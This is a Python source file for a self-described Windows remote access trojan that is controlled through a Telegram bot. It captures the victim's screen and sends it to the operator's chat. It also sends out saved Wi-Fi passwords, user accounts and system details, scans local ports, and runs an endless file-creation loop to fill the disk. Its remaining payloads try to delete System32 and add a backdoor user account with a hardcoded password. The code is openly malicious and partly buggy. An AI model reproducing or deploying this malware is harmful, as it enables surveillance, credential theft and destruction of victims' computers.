# library  | Rat for windows 
import telebot 
from telebot import types
import os
import pyautogui
from PIL import ImageGrab
import socket
import platform
import subprocess
import random

#  ▄▀▀▄    ▄▀▀▄  ▄▀▀█▀▄    ▄▀▀▄ ▀▄  ▄▀▀▄ ▄▄   ▄▀▀▄ ▄▀▀▄  ▄▀▀▄ ▀▄  ▄▀▀▀█▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀▄▀▀▀▄ 
#█   █    ▐  █ █   █  █  █  █ █ █ █  █   ▄▀ █   █    █ █  █ █ █ █    █  ▐ ▐  ▄▀   ▐ █   █   █ 
#▐  █        █ ▐   █  ▐  ▐  █  ▀█ ▐  █▄▄▄█  ▐  █    █  ▐  █  ▀█ ▐   █       █▄▄▄▄▄  ▐  █▀▀█▀  
#  █   ▄    █      █       █   █     █   █    █    █     █   █     █        █    ▌   ▄▀    █  
#   ▀▄▀ ▀▄ ▄▀   ▄▀▀▀▀▀▄  ▄▀   █     ▄▀  ▄▀     ▀▄▄▄▄▀  ▄▀   █    ▄▀        ▄▀▄▄▄▄   █     █   
#         ▀    █       █ █    ▐    █   █               █    ▐   █          █    ▐   ▐     ▐   
#              ▐       ▐ ▐         ▐   ▐               ▐        ▐          ▐                  
# token and chat id for connect bot
tk = ''   #your token bot 
CHAT_ID =      # your chat id 
#--------------------------------------------
try:
    bot = telebot.TeleBot(tk)
    bot.send_message(CHAT_ID,"bot connected🤖")
    bot.send_message(CHAT_ID,"🤖/start")
    @bot.message_handler(commands=["start"])
    def send_welcom(message):
        bot.reply_to(message,"Hello my friend🤖how are you ? | /help")
    @bot.message_handler(commands=["help"])
    def send_help(message):
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        item1 = types.KeyboardButton("info")
        item2 = types.KeyboardButton("Contact us")
        item3 = types.KeyboardButton("back")
        markup.add(item1,item2,item3)
        bot.send_message(message.chat.id,"How can I help you?🤖",reply_markup=markup)
    @bot.message_handler(commands=['show'])
    def result_search(message):
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        item1 = types.KeyboardButton("Screen Desktop👁")
        item2 = types.KeyboardButton("Lock monitor🪫")
        item3 = types.KeyboardButton("Shutdown system🔋")
        markup.add(item1,item2,item3)
        bot.send_message(message.chat.id,"What do you wanna do?🤖",reply_markup=markup)
    @bot.message_handler(commands=['information'])
    def result_search(message):
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        item1 = types.KeyboardButton("Get ip🌐")
        item2 = types.KeyboardButton("Operating-system-version🗞")
        item3 = types.KeyboardButton("Get Username-accounts🗃")
        item4 = types.KeyboardButton("Get ports-open🔓")
        markup.add(item1,item2,item3,item4)
        bot.send_message(message.chat.id,"What do you wanna do?🤖",reply_markup=markup)
    @bot.message_handler(commands=['executive'])
    def result_search(message):
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        item1 = types.KeyboardButton("Get passwords-wifi💀")
        item2 = types.KeyboardButton("Delete system32🧹")
        item3 = types.KeyboardButton("File bomber⚠️")
        item4 = types.KeyboardButton("Create new user😈")
        markup.add(item1,item2,item3,item4)
        bot.send_message(message.chat.id,"What do you wanna do?",reply_markup=markup)
    @bot.message_handler(func=lambda message: True)
    def handler_other_messgaes(message):
        if message.text == "info":
            bot.send_message(message.chat.id,"""I am a friend of hackers and anyone who wants to do something freely👁.
    My author wants the death of government systems and the elimination of slavery🎭""")
        elif message.text == "Contact us":
            bot.send_message(message.chat.id,"web site : newamooz.com ")
        elif message.text == "back":
            markup = types.ReplyKeyboardRemove(selective=False)
            bot.send_message(message.chat.id,"back to home",reply_markup=markup)
        elif message.text == "Screen Desktop👁":
            screen = ImageGrab.grab()
            screen.save("dsfqsjke.png")
            path_photo = "dsfqsjke.png"
            photo = open(path_photo,'rb')
            bot.send_photo(CHAT_ID,photo)
            photo.close()
            os.remove('dsfqsjke.png')
        elif message.text == "Lock monitor🪫":
            pyautogui.hotkey('win','l')
        elif message.text == "Trun off system🪫":
            os.system("shutdown /t /s 0")
        elif message.text == "Get ip🌐":
            hostname = socket.gethostname()
            ip_address = socket.gethostbyname(hostname)
            bot.send_message(CHAT_ID,f'TARGET IP : {ip_address}')
        elif message.text == "Operating-system-version🗞":
            info = platform.uname()
            bot.send_message(CHAT_ID,f"""📌system : {info.system}
➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
📌Node name : {info.node}         
➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
📌Version : {info.version}
➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
📌Machine : {info.machine}
➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
📌Processor : {info.processor}
➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖
📌Release : {info.release}""")
        elif message.text == "Get passwords-wifi💀":
            show = "netsh wlan show profile"
            out = subprocess.check_output(show,shell=True,text=True)
            profiles = [line.split(":")[1][1:-1] for line in out.splitlines() if "all user" in line]
            for profile in profiles:
                show_pass = f'netsh wlan show profile name="{profile}" key=clear'
                pass_show = subprocess.check_output(show_pass,shell=True,text=True)
                bot.send_message(CHAT_ID,pass_show)

        elif message.text == "Get passwords-wifi💀":
            show = "netsh wlan show profile"
            out = subprocess.check_output(show, shell=True)
            out_str = out.decode('utf-8')
            profiles = [line.split(":")[1][1:-1] for line in out_str.splitlines() if "all user" in line]
            for profile in profiles:
                show_pass = f'netsh wlan show profile name="{profile}" key=clear'
                pass_show = subprocess.check_output(show_pass, shell=True)
                pass_show_str = pass_show.decode('utf-8')
                bot.send_message(CHAT_ID, pass_show_str)

        elif message.text == "Get Username-accounts🗃":
            output = subprocess.check_output("net user",shell=True)
            user = output.decode('utf-8')
            bot.send_message(CHAT_ID,user)
        elif message.text == "Get ports-open🔓":
            bot.send_message(CHAT_ID,"START SCAN TARGET🤖 ")
            bot.send_message(CHAT_ID,"""
List Of Scannig Ports:
---------------------------
22 -> SSH   || 143 -> IMAP 
21 -> FTP   || 443 -> HTTPS
3389 -> RDP || 25 -> SMTP
80 -> HTTP  || 110 -> POP3
5900 -> VNC || 5432 -> PostgreSQL
161 -> SNMP || 8081 -> HTTP PROXY
123 -> NTP  || 69 -> TFTP
23 -> TELNET|| 67 -> DHCP
3690 -> SVN || 27017 -> MongoDB
5060 -> SIP || 514 -> Syslog
465 -> SMTPS|| 119 -> NNTP
6667 -> IRC 
""")
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            ports = [22 , 21 ,3389,3306,80,143,443,25,110,5900,5432,8081,161,123,69,23,67,27017,3690,5060,514,465,119,6667] # port list
            for port in ports:
                res = s.connect_ex(("127.0.0.1",port))
                port = str(port)
                if res == 0 :
                    bot.send_message(CHAT_ID,f"PORT {port} OPEN💀")
            s.close()
        elif message.text == "File bomber⚠️":
            bot.send_message(CHAT_ID,"create files.....")
            while(1):
                count = 0
                number = random.randint(1,1000)
                os.system(f"fsutil file createnew help{number}.txt 1073741824")
                if count == 100:
                    break
                bot.send_message(CHAT_ID,"created 10 file.")
        elif message.text == "Delete system32🧹":
            bot.send_message(CHAT_ID,"delete system32!!!!")
            os.remove("C:\Windows\System32")
        elif message.text == "Delete files video🧹":
            pass
        elif message.text == "Create new user😈":
            bot.send_message(CHAT_ID,"wait...")
            # username and password account 
            username = "jocker"
            password = "M12345678tkkp"
            create_account = f"net user {username} {password} /add"
            subprocess.run(create_account,shell=True)
            bot.send_message(CHAT_ID,"User was created | USERNAME = jocker , PASSWORD = M12345678tkkp")
        else:
            bot.send_message(message.chat.id,"what?")
except:
    print("Oh Cannot connected:(")

if __name__ == '__main__':
    bot.polling()
